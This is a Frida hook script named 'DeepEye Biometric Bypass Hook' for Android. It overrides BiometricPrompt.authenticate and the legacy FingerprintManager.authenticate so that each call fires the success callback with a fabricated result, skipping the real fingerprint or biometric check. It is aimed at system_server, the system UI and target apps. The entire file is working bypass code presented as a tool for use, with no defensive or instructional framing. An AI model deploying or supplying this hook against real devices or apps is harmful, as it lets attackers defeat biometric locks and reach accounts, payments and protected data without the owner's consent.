/**
 * DeepEye Biometric Bypass Hook (v2026.32)
 * 
 * Bypasses BiometricPrompt and FingerprintManager authentication
 * by forcing success callbacks.
 * 
 * Targeted Processes:
 * - system_server
 * - com.android.systemui
 * - [Target Apps]
 */

Java.perform(function() {
    console.log('[DeepEye] Initializing Biometric Bypass...');

    const BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
    const FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
    const BiometricPromptAuthResult = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
    const FingerprintManagerAuthResult = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');

    // --- 1. BiometricPrompt Bypass ---
    try {
        BiometricPrompt.authenticate.overload(
            'android.hardware.biometrics.BiometricPrompt$CryptoObject',
            'android.os.CancellationSignal',
            'java.util.concurrent.Executor',
            'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
        ).implementation = function(crypto, signal, executor, callback) {
            console.log('[DeepEye] BiometricPrompt.authenticate() triggered!');
            
            // Send success callback
            const result = BiometricPromptAuthResult.$new(crypto, null, 0);
            callback.onAuthenticationSucceeded(result);
            
            console.log('[DeepEye] Forced BiometricPrompt success callback');
        };
        
        BiometricPrompt.authenticate.overload(
            'android.os.CancellationSignal',
            'java.util.concurrent.Executor',
            'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
        ).implementation = function(signal, executor, callback) {
            console.log('[DeepEye] BiometricPrompt.authenticate() [no crypto] triggered!');
            
            const result = BiometricPromptAuthResult.$new(null, null, 0);
            callback.onAuthenticationSucceeded(result);
            
            console.log('[DeepEye] Forced BiometricPrompt [no crypto] success callback');
        };
    } catch (e) {
        console.log('[DeepEye] BiometricPrompt hook failed: ' + e.message);
    }

    // --- 2. FingerprintManager Bypass (Legacy) ---
    try {
        FingerprintManager.authenticate.overload(
            'android.hardware.fingerprint.FingerprintManager$CryptoObject',
            'android.os.CancellationSignal',
            'int',
            'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
            'android.os.Handler'
        ).implementation = function(crypto, signal, flags, callback, handler) {
            console.log('[DeepEye] FingerprintManager.authenticate() triggered!');
            
            const result = FingerprintManagerAuthResult.$new(crypto, null, 0);
            callback.onAuthenticationSucceeded(result);
            
            console.log('[DeepEye] Forced FingerprintManager success callback');
        };
    } catch (e) {
        console.log('[DeepEye] FingerprintManager hook failed: ' + e.message);
    }

    console.log('[DeepEye] Biometric hooks active. Use any biometric to pass.');
});
